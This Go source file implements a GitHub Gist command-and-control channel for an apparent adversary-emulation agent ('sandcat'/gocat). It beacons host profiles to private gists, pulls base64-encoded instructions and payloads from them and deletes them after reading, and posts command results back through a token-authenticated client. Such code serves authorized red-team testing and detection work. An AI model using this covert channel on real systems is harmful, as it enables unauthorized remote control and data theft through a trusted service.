package contact

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"strconv"
	"time"

	"github.com/mitre/gocat/output"

	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
)

const (
	githubTimeout = 60
	githubTimeoutResetInterval = 5
	githubError = 500
)

var (
	token = ""
	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	username string
)

type GIST struct {
	name string
}

func init() {
	CommunicationChannels["GIST"] = GIST{ name: "GIST" }
}

//GetInstructions sends a beacon and returns instructions
func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
	checkValidSleepInterval(profile)
	var retBytes []byte
	bites, heartbeat := gistBeacon(profile)
	if heartbeat == true {
		retBytes = bites
	}
	return retBytes
}

//GetPayloadBytes load payload bytes from github
func (g GIST) GetPayloadBytes(profile map[string]interface{}, payload string) []byte {
	var payloadBytes []byte
	var err error
	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payload))
	if payloads[0] != "" {
		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
			return nil
		}
	}
	return payloadBytes
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (g GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) bool {
	if len(criteria["c2Key"]) > 0 {
		token = criteria["c2Key"]
		profile["paw"] = getBeaconNameIdentifier()
		return true
	}
	return false
}

//SendExecutionResults send results to the server
func (g GIST) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	gistResults(profileCopy)
}

func (g GIST) GetName() string {
	return g.name
}


func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
	heartbeat := createHeartbeatGist("beacon", profile)
	//collect instructions & delete
	contents := getGists("instructions", profile["paw"].(string))
	if contents != nil {
		decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
			return nil, heartbeat
		}
		return decodedContents, heartbeat
	}
	return nil, heartbeat
}

func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
	data, err := json.Marshal(profile)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist heartbeat. Error with profile marshal: %s", err.Error()))
		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		return false
	} else if createGist(gistType, profile["paw"].(string), data) != created {
		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		return false
	}
	output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
	return true
}

func gistResults(result map[string]interface{}) {
	data, err := json.Marshal(result)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist results. Error with result marshal: %s", err.Error()))
		output.VerbosePrint("[-] Results GIST: FAILED")
	} else if createGist("results", result["paw"].(string), data) != created {
		output.VerbosePrint("[-] Results GIST: FAILED")
	} else {
		output.VerbosePrint("[+] Results GIST: SUCCESS")
	}
}


func createGist(gistType string, uniqueId string, data []byte) int {
	ctx := context.Background()
	c2Client := createNewClient()
	gistDescriptor := getGistDescriptor(gistType, uniqueId)
	stringified := base64.StdEncoding.EncodeToString(data)
	file := github.GistFile{Content: &stringified,}
	files := make(map[github.GistFilename]github.GistFile)
	files[github.GistFilename(gistDescriptor)] = file
	public := false
	gist := github.Gist{Description: &gistDescriptor, Public: &public, Files: files,}
	_, resp, err := c2Client.Gists.Create(ctx, &gist)
	if err != nil {
		return githubError
	}
	return resp.StatusCode
}

func getGists(gistType string, uniqueID string) []string {
	ctx := context.Background()
	c2Client := createNewClient()
	var contents []string
	gists, _, err := c2Client.Gists.List(ctx, username, nil)
	if err == nil {
		for _, gist := range gists {
			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
				if err == nil {
					for _, file := range fullGist.Files {
						contents = append(contents, *file.Content)
					}
				}
				c2Client.Gists.Delete(ctx, fullGist.GetID())
			}
		}
	}
	return contents
}

func getGistDescriptor(gistType string, uniqueId string) string {
	return fmt.Sprintf("%s-%s", gistType, uniqueId)
}

func checkValidSleepInterval(profile map[string]interface{}) {
	if profile["sleep"] == githubTimeout{
		time.Sleep(time.Duration(float64(githubTimeoutResetInterval)) * time.Second)
	}
}

func getBeaconNameIdentifier() string {
	return strconv.Itoa(rand.Int())
}

func createNewClient() *github.Client {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)
	c2Client := github.NewClient(tc)
	return c2Client
}
